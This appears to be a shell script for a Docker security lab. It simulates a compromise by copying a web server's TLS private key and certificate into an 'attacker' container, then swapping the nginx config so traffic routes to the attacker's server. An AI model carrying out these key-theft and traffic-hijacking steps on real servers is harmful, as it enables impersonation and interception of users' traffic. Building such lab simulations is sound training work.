# Copy public and private keys from web server to simulate stolen certs
docker cp web_server:/etc/ssl/private/nginx-selfsigned.key .
docker cp web_server:/etc/ssl/certs/nginx-selfsigned.crt .

# Copy stolen certs to attackers machine so they can serve malicious webpage
docker exec -i attacker sh -c 'cat > /simple-https-python-server/nginx-selfsigned.crt' < ./nginx-selfsigned.crt
docker exec -i attacker sh -c 'cat > /simple-https-python-server/nginx-selfsigned.key' < ./nginx-selfsigned.key

# Remove intermediate cert files from machine running this script
rm -f nginx-selfsigned.crt
rm -f nginx-selfsigned.key

# Change c2_config.c2 file to route traffic to attackers machine
docker exec -i web_server sh -c 'cat > /etc/nginx/conf.d/default.conf' < ./nginx/c2_config_malicious.c2
docker exec -i web_server sh -c 'nginx -s reload'

# Launch attacker container
docker exec -it attacker /bin/bash